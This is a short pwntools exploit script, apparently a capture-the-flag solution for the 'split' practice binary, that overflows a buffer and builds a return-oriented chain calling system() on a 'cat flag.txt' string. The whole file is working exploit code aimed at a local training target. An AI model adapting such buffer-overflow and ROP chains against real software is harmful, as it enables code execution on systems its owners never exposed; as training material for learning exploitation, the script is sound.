#!/usr/bin/python3
from pwn import *
gs = '''
continue
'''
elf = context.binary = ELF('./split')
context.terminal = ['tmux', 'splitw', '-hp', '70']

def start():
    if args.GDB:
        return gdb.debug('./split', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./split')
r = start()
#========= exploit here ===================

poprdi = 0x4007c3
system = elf.sym.system
binsh = 0x601060 #cat flag.txt string
ret = 0x4006e7 #ret for ubuntu alignment
payload = "A" * 40
payload += p64(poprdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)

r.sendlineafter(">", payload)


#========= interactive ====================
r.interactive()
